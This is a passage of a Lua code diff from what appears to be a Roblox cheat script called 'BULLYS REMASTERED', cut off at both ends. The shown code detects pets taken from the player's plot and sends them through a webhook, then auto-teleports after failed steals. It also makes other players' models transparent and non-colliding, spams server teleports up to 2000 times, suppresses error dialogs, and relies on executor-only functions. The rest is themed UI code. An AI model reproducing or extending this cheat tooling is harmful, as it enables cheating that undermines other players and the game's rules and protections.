+            local currentPets = GetPetsOnPlot(GetMyPlot())
+            local stolenData = nil
+            
+            for slot, data in pairs(currentPets) do
+                local old = baseSnapshot[slot]
+                if not old or (old.Index ~= data.Index or old.Mutation ~= data.Mutation) then
+                    stolenData = data
+                    break
+                end
+            end
+            
+            if stolenData then
+    local name, gen, mut = GetInfo(stolenData)
+
+    SendWebhook(name, gen, mut)
+                if Config.AutoTpOnFailedSteal and stealDuration > 3 and distanceMoved > 60 then
+                    ShowNotification("STEAL FAILED", string.format("Auto TPing... (%.1fs, %d studs)", stealDuration, distanceMoved))
+                    task.spawn(runAutoSnipe)
+                end
+            end
+        end
+    end)
+end)
+
+SharedState.XrayData = {
+    TARGET_TRANS = 0.7,
+    INVISIBLE_TRANS = 1,
+    ENFORCE_EVERY_FRAME = true,
+    trackedObjects = {},
+    trackedModels = {},
+}
+SharedState.XrayFunctions = {}
+SharedState.XrayFunctions.nameHasClone = function(name)
+	return string.find(string.lower(name), "clone", 1, true) ~= nil
+end
+SharedState.XrayFunctions.getTargetTransparency = function(obj)
+	local xd = SharedState.XrayData
+	if obj.Name == "HumanoidRootPart" then return xd.INVISIBLE_TRANS end
+	return xd.TARGET_TRANS
+end
+SharedState.XrayFunctions.applyObject = function(obj)
+	local target = SharedState.XrayFunctions.getTargetTransparency(obj)
+	if obj:IsA("BasePart") then
+		obj.CanCollide = false
+		obj.Transparency = target
+	elseif obj:IsA("Decal") or obj:IsA("Texture") then
+		obj.Transparency = target
+	end
+end
+SharedState.XrayFunctions.trackObject = function(obj)
+	local xd = SharedState.XrayData
+	local xf = SharedState.XrayFunctions
+	if xd.trackedObjects[obj] then return end
+	if not (obj:IsA("BasePart") or obj:IsA("Decal") or obj:IsA("Texture")) then return end
+	xd.trackedObjects[obj] = true
+	xf.applyObject(obj)
+	if obj:IsA("BasePart") then
+		obj:GetPropertyChangedSignal("CanCollide"):Connect(function()
+			if obj.CanCollide ~= false then obj.CanCollide = false end
+		end)
+	end
+	obj:GetPropertyChangedSignal("Transparency"):Connect(function()
+		local correctTrans = xf.getTargetTransparency(obj)
+		if obj.Transparency ~= correctTrans then obj.Transparency = correctTrans end
+	end)
+	obj.AncestryChanged:Connect(function()
+		if obj.Parent == nil then xd.trackedObjects[obj] = nil end
+	end)
+end
+SharedState.XrayFunctions.trackModel = function(model)
+	local xd = SharedState.XrayData
+	local xf = SharedState.XrayFunctions
+	if xd.trackedModels[model] then return end
+	xd.trackedModels[model] = true
+	local descendants = model:GetDescendants()
+	for i = 1, #descendants do xf.trackObject(descendants[i]) end
+	model.DescendantAdded:Connect(function(d) xf.trackObject(d) end)
+	model.AncestryChanged:Connect(function()
+		if model.Parent == nil then xd.trackedModels[model] = nil end
+	end)
+end
+SharedState.XrayFunctions.handleWorkspaceChild = function(child)
+	if child.Parent ~= Workspace then return end
+	if not child:IsA("Model") then return end
+	if not SharedState.XrayFunctions.nameHasClone(child.Name) then return end
+	SharedState.XrayFunctions.trackModel(child)
+end
+SharedState.XrayFunctions.hookRename = function(child)
+	if child:IsA("Model") then
+		child:GetPropertyChangedSignal("Name"):Connect(function()
+			SharedState.XrayFunctions.handleWorkspaceChild(child)
+		end)
+	end
+end
+SharedState.XrayFunctions.initWorkspaceTracking = function()
+	local workspaceChildren = Workspace:GetChildren()
+	for i = 1, #workspaceChildren do
+		SharedState.XrayFunctions.handleWorkspaceChild(workspaceChildren[i])
+		SharedState.XrayFunctions.hookRename(workspaceChildren[i])
+	end
+end
+SharedState.XrayFunctions.initWorkspaceTracking()
+Workspace.ChildAdded:Connect(function(child)
+	task.defer(function() SharedState.XrayFunctions.handleWorkspaceChild(child) end)
+	SharedState.XrayFunctions.hookRename(child)
+end)
+if SharedState.XrayData.ENFORCE_EVERY_FRAME then
+	SharedState.XrayFunctions.enforceXrayFrame = function()
+		local xd = SharedState.XrayData
+		local xf = SharedState.XrayFunctions
+		local objList = {}
+		for obj in pairs(xd.trackedObjects) do table.insert(objList, obj) end
+		for i = 1, #objList do
+			local obj = objList[i]
+			if obj.Parent == nil then
+				xd.trackedObjects[obj] = nil
+			else
+				if obj:IsA("BasePart") and obj.CanCollide ~= false then obj.CanCollide = false end
+				local target = xf.getTargetTransparency(obj)
+				if obj.Transparency ~= target then obj.Transparency = target end
+			end
+		end
+	end
+	RunService.Heartbeat:Connect(SharedState.XrayFunctions.enforceXrayFrame)
+end
+
+SharedState.FPSFunctions = {}
+SharedState.FPSFunctions.removeMeshes = function(tool)
+	if not tool:IsA("Tool") then return end
+	local handle = tool:FindFirstChild("Handle")
+	if not handle then return end
+	local descendants = handle:GetDescendants()
+	for i = 1, #descendants do
+		local descendant = descendants[i]
+		if descendant:IsA("SpecialMesh") or descendant:IsA("Mesh") or descendant:IsA("FileMesh") then
+			descendant:Destroy()
+		end
+	end
+end
+SharedState.FPSFunctions.onCharacterAdded = function(character)
+	local ff = SharedState.FPSFunctions
+	character.ChildAdded:Connect(function(child)
+		if child:IsA("Tool") and Config.FPSBoost then ff.removeMeshes(child) end
+	end)
+	local children = character:GetChildren()
+	for i = 1, #children do
+		if children[i]:IsA("Tool") then ff.removeMeshes(children[i]) end
+	end
+end
+SharedState.FPSFunctions.onPlayerAdded = function(player)
+	local ff = SharedState.FPSFunctions
+	player.CharacterAdded:Connect(ff.onCharacterAdded)
+	if player.Character then ff.onCharacterAdded(player.Character) end
+end
+SharedState.FPSFunctions.initPlayerTracking = function()
+	local ff = SharedState.FPSFunctions
+	local allPlayers = Players:GetPlayers()
+	for i = 1, #allPlayers do ff.onPlayerAdded(allPlayers[i]) end
+	Players.PlayerAdded:Connect(ff.onPlayerAdded)
+end
+SharedState.FPSFunctions.initPlayerTracking()
+
+if Config.CleanErrorGUIs then
+    task.spawn(function()
+        local GuiService = cloneref and cloneref(game:GetService("GuiService")) or game:GetService("GuiService")
+        while true do
+            if Config.CleanErrorGUIs then
+                pcall(function() GuiService:ClearError() end)
+            end
+            task.wait(0.005)
+        end
+    end)
+end
+
+
+task.spawn(function()
+    local HTheme = {
+        Background = Color3.fromRGB(10,10,10),
+        Accent1 = Color3.fromRGB(170,170,170),
+        Accent2 = Color3.fromRGB(125,125,125),
+        White   = Color3.fromRGB(240,240,240),
+        Gray    = Color3.fromRGB(125,125,125),
+        Success = Color3.fromRGB(170,170,170),
+        Error   = Color3.fromRGB(210, 90, 90)
+    }
+
+    local SCALE = 1
+    local HEIGHT = 50 * SCALE
+    
+    local joinerGui = Instance.new("ScreenGui")
+    joinerGui.Name = "BullysJobJoiner"
+    joinerGui.ResetOnSpawn = false
+    joinerGui.Enabled = Config.ShowJobJoiner
+    joinerGui.Parent = PlayerGui
+
+    local main = Instance.new("Frame")
+    main.Name = "Main"
+    main.Size = UDim2.new(0, 500 * SCALE, 0, HEIGHT)
+    
+    local savedPos = Config.Positions.JobJoiner or {X = 0.5, Y = 0.85}
+    
+    main.AnchorPoint = Vector2.new(0.5, 0) 
+    main.Position = UDim2.new(savedPos.X, 0, savedPos.Y, 0)
+    
+    main.BackgroundColor3 = Color3.fromRGB(20,22,28)
+    main.BackgroundTransparency = 0.15
+    main.BorderSizePixel = 0
+    main.Parent = joinerGui
+
+    Instance.new("UICorner", main).CornerRadius = UDim.new(0, 12)
+
+    local bgGradient = Instance.new("UIGradient", main)
+    bgGradient.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20,22,28)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(25,27,35))
+    }
+    bgGradient.Rotation = 45
+
+    local stroke = Instance.new("UIStroke", main)
+    stroke.Thickness = 2
+    stroke.Transparency = 0.3
+    
+    local strokeGrad = Instance.new("UIGradient", stroke)
+    strokeGrad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, HTheme.Accent1),
+        ColorSequenceKeypoint.new(0.5, HTheme.Accent2),
+        ColorSequenceKeypoint.new(1, HTheme.Accent1)
+    }
+    
+    task.spawn(function()
+        while stroke.Parent do
+            strokeGrad.Rotation = strokeGrad.Rotation + 1
+            task.wait(0.05)
+        end
+    end)
+
+    MakeDraggable(main, main, "JobJoiner")
+
+    local content = Instance.new("Frame", main)
+    content.Size = UDim2.new(1, -20*SCALE, 1, 0)
+    content.Position = UDim2.new(0, 10*SCALE, 0, 0)
+    content.BackgroundTransparency = 1
+    
+    local layout = Instance.new("UIListLayout", content)
+    layout.FillDirection = Enum.FillDirection.Horizontal
+    layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+    layout.VerticalAlignment = Enum.VerticalAlignment.Center
+    layout.Padding = UDim.new(0, 8 * SCALE)
+
+    local function CreateInput(placeholder, width, default)
+        local frame = Instance.new("Frame")
+        frame.BackgroundTransparency = 1
+        frame.Size = UDim2.new(0, width * SCALE, 0, 32 * SCALE)
+        
+        local label = Instance.new("TextLabel", frame)
+        label.Size = UDim2.new(1, 0, 0, 10 * SCALE)
+        label.Position = UDim2.new(0, 0, 0, -10 * SCALE)
+        label.BackgroundTransparency = 1
+        label.Text = placeholder
+        label.TextColor3 = HTheme.Accent1
+        label.Font = Enum.Font.GothamBold
+        label.TextSize = 9 * SCALE
+        
+        local box = Instance.new("TextBox", frame)
+        box.Size = UDim2.new(1, 0, 1, 0)
+        box.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+        box.BackgroundTransparency = 0.5
+        box.Text = default or ""
+        box.PlaceholderText = placeholder
+        box.TextColor3 = HTheme.White
+        box.Font = Enum.Font.GothamBold
+        box.TextSize = 12 * SCALE
+        box.ClearTextOnFocus = false
+        
+        Instance.new("UICorner", box).CornerRadius = UDim.new(0, 6)
+        local s = Instance.new("UIStroke", box)
+        s.Color = HTheme.Gray
+        s.Thickness = 0.1
+        s.Transparency = 0.6
+        
+        box.Focused:Connect(function() 
+            TweenService:Create(s, TweenInfo.new(0.2), {Color = HTheme.Accent1, Transparency = 0}):Play() 
+        end)
+        box.FocusLost:Connect(function() 
+            TweenService:Create(s, TweenInfo.new(0.2), {Color = HTheme.Gray, Transparency = 0.6}):Play() 
+        end)
+        
+        return frame, box
+    end
+
+    local function CreateButton(text, width, color)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(0, width * SCALE, 0, 32 * SCALE)
+        btn.BackgroundColor3 = color
+        btn.BackgroundTransparency = 0.2
+        btn.Text = text
+        btn.Font = Enum.Font.GothamBlack
+        btn.TextSize = 12 * SCALE
+        btn.TextColor3 = HTheme.White
+        btn.AutoButtonColor = false
+        
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+        local s = Instance.new("UIStroke", btn)
+        s.Color = color
+        s.Thickness = 1.5
+        s.Transparency = 0.4
+        
+        btn.MouseEnter:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
+            TweenService:Create(s, TweenInfo.new(0.2), {Transparency = 0.1}):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundTransparency = 0.2}):Play()
+            TweenService:Create(s, TweenInfo.new(0.2), {Transparency = 0.4}):Play()
+        end)
+        
+        return btn
+    end
+
+    local joinBtn = CreateButton("JOIN", 60, HTheme.Success)
+    joinBtn.Parent = content
+
+    local idFrame, idBox = CreateInput("", 180, "")
+    idBox.PlaceholderText = ""
+    idFrame.Parent = content
+    idBox.TextTruncate = Enum.TextTruncate.AtEnd
+
+    local clearBtn = CreateButton("CLEAR", 50, Color3.fromRGB(60, 60, 70))
+    clearBtn.Parent = content
+
+    local attFrame, attBox = CreateInput("Attempts", 60, "2000")
+    attFrame.Parent = content
+
+    local delFrame, delBox = CreateInput("Delay", 50, "0.01")
+    delFrame.Parent = content
+
+    local isJoining = false
+    
+    joinBtn.MouseButton1Click:Connect(function()
+        if isJoining then
+            isJoining = false
+            joinBtn.Text = "JOIN"
+            joinBtn.BackgroundColor3 = HTheme.Success
+            ShowNotification("JOINER", "Process Cancelled")
+            return
+        end
+
+        local jobId = idBox.Text:gsub("%s+", "") 
+        local attempts = tonumber(attBox.Text) or 10
+        local delayTime = tonumber(delBox.Text) or 0.5
+
+        if jobId == "" or #jobId < 5 then
+            ShowNotification("ERROR", "Invalid JobID")
+            return
+        end
+
+        isJoining = true
+        joinBtn.Text = "STOP"
+        joinBtn.BackgroundColor3 = HTheme.Error
+        
+        task.spawn(function()
+            for i = 1, attempts do
+                if not isJoining then break end
+                
+                ShowNotification("JOINING", string.format("Attempt %d/%d...", i, attempts))
+                
+                local success, err = pcall(function()
+                    TeleportService:TeleportToPlaceInstance(game.PlaceId, jobId, LocalPlayer)
+                end)
+
+                if not success then
+                    
+                end
+                
+                task.wait(delayTime)
+            end
+            
+            isJoining = false
+            if joinBtn and joinBtn.Parent then
+                joinBtn.Text = "JOIN"
+                joinBtn.BackgroundColor3 = HTheme.Success
+            end
+        end)
+    end)
+
+    clearBtn.MouseButton1Click:Connect(function()
+        idBox.Text = ""
+    end)
+end)
+
+task.spawn(function()
+    local tGui = Instance.new("ScreenGui")
+    tGui.Name = "BullysThemeUI"
+    tGui.ResetOnSpawn = false
+    tGui.DisplayOrder = 50
+    tGui.Parent = PlayerGui
+
+    -- Painel principal
+    local tPanel = Instance.new("Frame", tGui)
+    tPanel.Name = "ThemePanel"
+    tPanel.Size = UDim2.new(0, 220, 0, 440)
+    tPanel.Position = UDim2.new(0.5, -110, 0, 80)
+    tPanel.BackgroundColor3 = Color3.fromRGB(20, 15, 20)
+    tPanel.BackgroundTransparency = 0.12
+    tPanel.BorderSizePixel = 0
+    tPanel.Visible = false
+    Instance.new("UICorner", tPanel).CornerRadius = UDim.new(0, 12)
+
+    local tStroke = Instance.new("UIStroke", tPanel)
+    tStroke.Color = Color3.fromRGB(255, 120, 200)
+    tStroke.Thickness = 1.5
+    tStroke.Transparency = 0.3
+
+    -- Gradiente de borda animado
+    local tStrokeGrad = Instance.new("UIGradient", tStroke)
+    tStrokeGrad.Color = ColorSequence.new{
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(170, 170, 170)),
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(125, 125, 125)),
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 170, 170)),
+    }
+    task.spawn(function()
+        while tStroke.Parent do
+            tStrokeGrad.Rotation = (tStrokeGrad.Rotation + 2) % 360
+            task.wait(0.05)
+        end
+    end)
+
+    -- Header / drag
+    local tHeader = Instance.new("Frame", tPanel)
+    tHeader.Size = UDim2.new(1, 0, 0, 36)
+    tHeader.BackgroundTransparency = 1
+
+    local tTitle = Instance.new("TextLabel", tHeader)
+    tTitle.Size = UDim2.new(1, -40, 1, 0)
+    tTitle.Position = UDim2.new(0, 14, 0, 0)
+    tTitle.BackgroundTransparency = 1
+    tTitle.Text = "🎨 TEMAS"
+    tTitle.Font = Enum.Font.GothamBlack
+    tTitle.TextSize = 14
+    tTitle.TextColor3 = Color3.fromRGB(240, 240, 240)
+    tTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+    local tClose = Instance.new("TextButton", tHeader)
+    tClose.Size = UDim2.new(0, 24, 0, 24)
+    tClose.Position = UDim2.new(1, -30, 0.5, -12)
+    tClose.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
+    tClose.Text = "✕"
+    tClose.Font = Enum.Font.GothamBold
+    tClose.TextSize = 12
+    tClose.TextColor3 = Color3.new(1, 1, 1)
+    tClose.AutoButtonColor = false
+    Instance.new("UICorner", tClose).CornerRadius = UDim.new(1, 0)
+    tClose.MouseButton1Click:Connect(function()
+        tPanel.Visible = false
+    end)
+
+    -- Drag
+    MakeDraggable(tHeader, tPanel)
+
+    -- Divisor
+    local tDiv = Instance.new("Frame", tPanel)
+    tDiv.Size = UDim2.new(1, -20, 0, 1)
+    tDiv.Position = UDim2.new(0, 10, 0, 36)
+    tDiv.BackgroundColor3 = Color3.fromRGB(170, 170, 170)
+    tDiv.BackgroundTransparency = 0.6
+    tDiv.BorderSizePixel = 0
+
+    -- Container dos botões
+    local tContent = Instance.new("Frame", tPanel)
+    tContent.Size = UDim2.new(1, -20, 1, -46)
+    tContent.Position = UDim2.new(0, 10, 0, 44)
+    tContent.BackgroundTransparency = 1
+
+    local tLayout = Instance.new("UIListLayout", tContent)
+    tLayout.Padding = UDim.new(0, 8)
+    tLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+    -- Theme data
+    local TD = {
+        {"BLACK",   "preto",    Color3.fromRGB(170,170,170), Color3.fromRGB(10,10,10)},
+    }
+
+    for i, td in ipairs(TD) do
+        local row = Instance.new("Frame", tContent)
+        row.Size = UDim2.new(1, 0, 0, 36)
+        row.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        row.BackgroundTransparency = 0.2
+        row.BorderSizePixel = 0
+        row.LayoutOrder = i
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 8)
+
+        local rowStroke = Instance.new("UIStroke", row)
+        rowStroke.Color = td[3]
+        rowStroke.Thickness = 1
+        rowStroke.Transparency = 0.6
+
+        local dot = Instance.new("Frame", row)
+        dot.Size = UDim2.new(0, 12, 0, 12)
+        dot.Position = UDim2.new(0, 12, 0.5, -6)
+        dot.BackgroundColor3 = td[3]
+        dot.BorderSizePixel = 0
+        Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)
+
+        local nameLbl = Instance.new("TextLabel", row)
+        nameLbl.Size = UDim2.new(0.5, 0, 1, 0)
+        nameLbl.Position = UDim2.new(0, 32, 0, 0)
+        nameLbl.BackgroundTransparency = 1
+        nameLbl.Text = td[1]
+        nameLbl.Font = Enum.Font.GothamBold
+        nameLbl.TextSize = 12
+        nameLbl.TextColor3 = Color3.fromRGB(240, 240, 240)
+        nameLbl.TextXAlignment = Enum.TextXAlignment.Left
+
+        local apBtn = Instance.new("TextButton", row)
+        apBtn.Size = UDim2.new(0, 72, 0, 24)
+        apBtn.Position = UDim2.new(1, -78, 0.5, -12)
+        apBtn.BackgroundColor3 = td[3]
+        apBtn.Text = "APPLY"
+        apBtn.Font = Enum.Font.GothamBold
+        apBtn.TextSize = 10
+        apBtn.TextColor3 = Color3.new(0, 0, 0)
+        apBtn.AutoButtonColor = false
+        Instance.new("UICorner", apBtn).CornerRadius = UDim.new(0, 6)
+
+        local apStroke = Instance.new("UIStroke", apBtn)
+        apStroke.Color = td[3]
+        apStroke.Thickness = 1
+        apStroke.Transparency = 0.4
+
+        local tid = td[2]
+        apBtn.MouseButton1Click:Connect(function()
+            applyTheme(tid)
+            -- feedback visual
+            local oldBg = tPanel.BackgroundColor3
+            TweenService:Create(tPanel, TweenInfo.new(0.15), {BackgroundColor3 = td[4]}):Play()
+            task.delay(0.5, function()
+                TweenService:Create(tPanel, TweenInfo.new(0.3), {BackgroundColor3 = Theme.Background}):Play()
+            end)
+        end)
+        apBtn.MouseEnter:Connect(function()
+            TweenService:Create(apBtn, TweenInfo.new(0.1), {BackgroundTransparency = 0.25}):Play()
+            TweenService:Create(rowStroke, TweenInfo.new(0.1), {Transparency = 0.1}):Play()
+        end)
+        apBtn.MouseLeave:Connect(function()
+            TweenService:Create(apBtn, TweenInfo.new(0.1), {BackgroundTransparency = 0}):Play()
+            TweenService:Create(rowStroke, TweenInfo.new(0.1), {Transparency = 0.6}):Play()
+        end)
+    end
+
+    -- Botão de tema desativado - substituido pela nova UI
+    local tToggle = Instance.new("TextButton", tGui)
+    tToggle.Name = "ThemeToggleBtn"
+    tToggle.Visible = false
+    tToggle.Size = UDim2.new(0, 36, 0, 36)
+    tToggle.Position = UDim2.new(0, 10, 0, 10)
+    tToggle.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    tToggle.BackgroundTransparency = 0.1
+    tToggle.Text = "🎨"
+    tToggle.Font = Enum.Font.GothamBlack
+    tToggle.TextSize = 18
+    tToggle.TextColor3 = Color3.fromRGB(185, 185, 185)
+    tToggle.AutoButtonColor = false
+    Instance.new("UICorner", tToggle).CornerRadius = UDim.new(1, 0)
+    local togStroke = Instance.new("UIStroke", tToggle)
+    togStroke.Color = Color3.fromRGB(170, 170, 170)
+    togStroke.Thickness = 1.5
+    togStroke.Transparency = 0.3
+    MakeDraggable(tToggle, tToggle)
+
+    tToggle.MouseButton1Click:Connect(function()
+        tPanel.Visible = not tPanel.Visible
+        if tPanel.Visible then
+            tPanel.Position = UDim2.new(
+                tToggle.Position.X.Scale, tToggle.AbsolutePosition.X + 44,
+                tToggle.Position.Y.Scale, tToggle.AbsolutePosition.Y
+            )
+        end
+    end)
+
+    -- Pulso no botão toggle
+    task.spawn(function()
+        while tToggle.Parent do
+            TweenService:Create(togStroke, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.7}):Play()
+            task.wait(1.6)
+        end
+    end)
+
+    -- Expor ref global para outros scripts
+    _G.ThemeUI = {panel = tPanel, toggle = tToggle, apply = applyTheme}
+end)
+
+function buildBullysSettingsUI()
+    local pg = PlayerGui
+    if not pg then return end
+    local oldBSG2 = pg:FindFirstChild("BullysSettings")
+    if oldBSG2 then oldBSG2:Destroy() end
+
+    local bsg = Instance.new("ScreenGui")
+    bsg.Name = "BullysSettings"
+    bsg.ResetOnSpawn = false
+    bsg.DisplayOrder = 20
+    bsg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    bsg.Parent = pg
+
+    -- ── cores base do tema ──
+    local function C() return {
+        BG   = Theme.Background,
+        SURF = Theme.Surface,
+        SH   = Theme.SurfaceHighlight,
+        AC   = Theme.Accent1,
+        TP   = Theme.TextPrimary,
+        TS   = Theme.TextSecondary,
+        ERR  = Theme.Error,
+        SUC  = Theme.Success,
+    } end
+
+    -- Painel principal
+    local panel = Instance.new("Frame", bsg)
+    panel.Name = "MainPanel"
+    panel.Size = UDim2.new(0, 330, 0, 510)
+    do
+        local sp = Config.BullysSettingsPos
+        if sp then
+            panel.Position = UDim2.new(sp.X, 0, sp.Y, 0)
+        else
+            panel.Position = UDim2.new(0, 60, 0.5, -235)
+        end
+    end
+    panel.BackgroundColor3 = C().BG
+    panel.BackgroundTransparency = 0.08
+    panel.BorderSizePixel = 0
+    panel.Visible = false
+    Instance.new("UICorner", panel).CornerRadius = UDim.new(0, 10)
+
+    local panStroke = Instance.new("UIStroke", panel)
+    panStroke.Color = Theme.Accent1
+    panStroke.Thickness = 1.5
+    panStroke.Transparency = 0.45
+    task.defer(function() if addRacetrackBorder then addRacetrackBorder(panel, Theme.Accent1, 3) end end)
+
+    -- Header
+    local hdr = Instance.new("Frame", panel)
+    hdr.Size = UDim2.new(1, 0, 0, 38)
+    hdr.BackgroundTransparency = 1
+    MakeDraggable(hdr, panel)
+    -- Save position after drag ends
+    hdr.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
+            inp.Changed:Connect(function()
+                if inp.UserInputState == Enum.UserInputState.End then
+                    local ps = panel.Parent.AbsoluteSize
+                    Config.BullysSettingsPos = {
+                        X = panel.AbsolutePosition.X / ps.X,
+                        Y = panel.AbsolutePosition.Y / ps.Y,
+                    }
+                    SaveConfig()
+                end
+            end)
+        end
+    end)
+
+    local hTitle = Instance.new("TextLabel", hdr)
+    hTitle.Size = UDim2.new(0, 120, 1, 0)
+    hTitle.Position = UDim2.new(0, 12, 0, 0)
+    hTitle.BackgroundTransparency = 1
+    hTitle.Text = "BULLYS REMASTERED"
+    hTitle.Font = Enum.Font.GothamBlack
+    hTitle.TextSize = 16
+    hTitle.TextColor3 = C().TP
+    hTitle.TextXAlignment = Enum.TextXAlignment.Left
+
+    local hFps = Instance.new("TextLabel", hdr)
+    hFps.Size = UDim2.new(0, 150, 1, 0)
+    hFps.Position = UDim2.new(0, 120, 0, 0)
+    hFps.BackgroundTransparency = 1
+    hFps.RichText = true
+    hFps.Text = ""
+    hFps.Font = Enum.Font.GothamBold
+    hFps.TextSize = 11
+    hFps.TextColor3 = C().TS
+    hFps.TextXAlignment = Enum.TextXAlignment.Left
+    task.spawn(function()
+        local fr, ac2 = 0, 0
+        RunService.Heartbeat:Connect(function(dt)
+            fr += 1; ac2 += dt
+            if ac2 >= 1 then
+                local p2 = math.floor(LocalPlayer:GetNetworkPing()*1000)
+                local fc = fr>=50 and "rgb(80,255,150)" or "rgb(255,210,80)"
+                local pc = p2<100 and "rgb(80,255,150)" or "rgb(255,210,80)"
+                hFps.Text = string.format("<font color='%s'>FPS:%d</font>  <font color='%s'>PING:%dms</font>",fc,fr,pc,p2)
+                fr, ac2 = 0, 0
+            end
+        end)
+    end)
+
+    local hClose = Instance.new("TextButton", hdr)
+    hClose.Size = UDim2.new(0, 20, 0, 20)
+    hClose.Position = UDim2.new(1, -28, 0.5, -10)
+    hClose.BackgroundTransparency = 1
+    hClose.Text = "─"
+    hClose.Font = Enum.Font.GothamBold
+    hClose.TextSize = 14
+    hClose.TextColor3 = C().TS
+    hClose.AutoButtonColor = false
+    hClose.MouseButton1Click:Connect(function() panel.Visible = false end)
+    hClose.MouseEnter:Connect(function() hClose.TextColor3 = C().TP end)
+    hClose.MouseLeave:Connect(function() hClose.TextColor3 = C().TS end)
+
+    -- Divisor
+    local hDiv = Instance.new("Frame", panel)
+    hDiv.Size = UDim2.new(1,-24,0,1)
+    hDiv.Position = UDim2.new(0,12,0,38)
+    hDiv.BackgroundColor3 = C().SH
+    hDiv.BackgroundTransparency = 0
+    hDiv.BorderSizePixel = 0
+
+    -- Tab Bar (3 rows of 3)
+    local tabBar = Instance.new("Frame", panel)
+    tabBar.Size = UDim2.new(1,-20,0,96)
+    tabBar.Position = UDim2.new(0,10,0,44)
+    tabBar.BackgroundTransparency = 1
+
+    -- Content Area
+    local cArea = Instance.new("Frame", panel)
+    cArea.Size = UDim2.new(1,-20,1,-148)
+    cArea.Position = UDim2.new(0,10,0,148)
+    cArea.BackgroundTransparency = 1
+    cArea.ClipsDescendants = true
+
+    -- ── helpers ──
+    local function makeScroll()
+        local sf = Instance.new("ScrollingFrame", cArea)
+        sf.Size = UDim2.new(1,0,1,0)
+        sf.BackgroundTransparency = 1
+        sf.BorderSizePixel = 0
+        sf.ScrollBarThickness = 0
+        sf.ScrollBarImageColor3 = Theme.Accent1
+        sf.CanvasSize = UDim2.new(0,0,0,0)
+        sf.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        sf.Visible = false
+        local ll = Instance.new("UIListLayout", sf)
+        ll.Padding = UDim.new(0,5)
+        ll.SortOrder = Enum.SortOrder.LayoutOrder
+        local pp = Instance.new("UIPadding", sf)
+        pp.PaddingTop  = UDim.new(0,5)
+        pp.PaddingBottom = UDim.new(0,5)
+        pp.PaddingLeft = UDim.new(0,2)
+        pp.PaddingRight = UDim.new(0,2)
+        return sf
+    end
+
+    local function makeBtn(parent, lbl, order, callback)
+        local btn = Instance.new("TextButton", parent)
+        btn.Size = UDim2.new(1,0,0,38)
+        btn.BackgroundColor3 = C().SURF
+        btn.BackgroundTransparency = 0
+        btn.Text = lbl
+        btn.Font = Enum.Font.GothamBold
+        btn.TextSize = 13
+        btn.TextColor3 = C().TP
+        btn.BorderSizePixel = 0
+        btn.AutoButtonColor = false
+        btn.LayoutOrder = order
+        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,7)
+        local bs = Instance.new("UIStroke", btn)
+        bs.Color = C().SH
+        bs.Thickness = 1
+        bs.Transparency = 0
+        btn.MouseEnter:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3=C().SH}):Play()
+            TweenService:Create(bs, TweenInfo.new(0.1), {Color=Theme.Accent1, Transparency=0.3}):Play()
+        end)
+        btn.MouseLeave:Connect(function()
+            TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3=C().SURF}):Play()
+            TweenService:Create(bs, TweenInfo.new(0.1), {Color=C().SH, Transparency=0}):Play()
+        end)
+        btn.MouseButton1Click:Connect(callback)
+        return btn
+    end
+
+    local function makeSec(parent, lbl, order)
+        local row = Instance.new("Frame", parent)
+        row.Size = UDim2.new(1,0,0,22)
+        row.BackgroundTransparency = 1
+        row.LayoutOrder = order
+        local bar = Instance.new("Frame", row)
+        bar.Size = UDim2.new(1,0,0,1)
+        bar.Position = UDim2.new(0,0,1,-1)
+        bar.BackgroundColor3 = C().SH
+        bar.BorderSizePixel = 0
+        local tl = Instance.new("TextLabel", row)
+        tl.Size = UDim2.new(1,0,1,0)
+        tl.BackgroundTransparency = 1
+        tl.Text = lbl
+        tl.Font = Enum.Font.GothamBlack
+        tl.TextSize = 11
+        tl.TextColor3 = Theme.Accent1
+        tl.TextXAlignment = Enum.TextXAlignment.Left
+        return row
+    end
+
+    local function makeToggle(parent, lbl, get, set, order)
+        local row = Instance.new("Frame", parent)
+        row.Size = UDim2.new(1,0,0,36)
+        row.BackgroundColor3 = C().SURF
+        row.BackgroundTransparency = 0
+        row.BorderSizePixel = 0
+        row.LayoutOrder = order
+        Instance.new("UICorner", row).CornerRadius = UDim.new(0,7)
+
+        local tl = Instance.new("TextLabel", row)
+        tl.Size = UDim2.new(1,-54,1,0)
+        tl.Position = UDim2.new(0,10,0,0)
+        tl.BackgroundTransparency = 1
+        tl.Text = lbl
+        tl.Font = Enum.Font.GothamBold
+        tl.TextSize = 12
+        tl.TextColor3 = C().TP
+        tl.TextXAlignment = Enum.TextXAlignment.Left
+
+        local sw = Instance.new("Frame", row)
+        sw.Size = UDim2.new(0,38,0,20)
+        sw.Position = UDim2.new(1,-46,0.5,-10)
+        sw.BackgroundColor3 = get() and Theme.Accent1 or C().SH
+        Instance.new("UICorner", sw).CornerRadius = UDim.new(1,0)
+
+        local dot = Instance.new("Frame", sw)
+        dot.Size = UDim2.new(0,15,0,15)
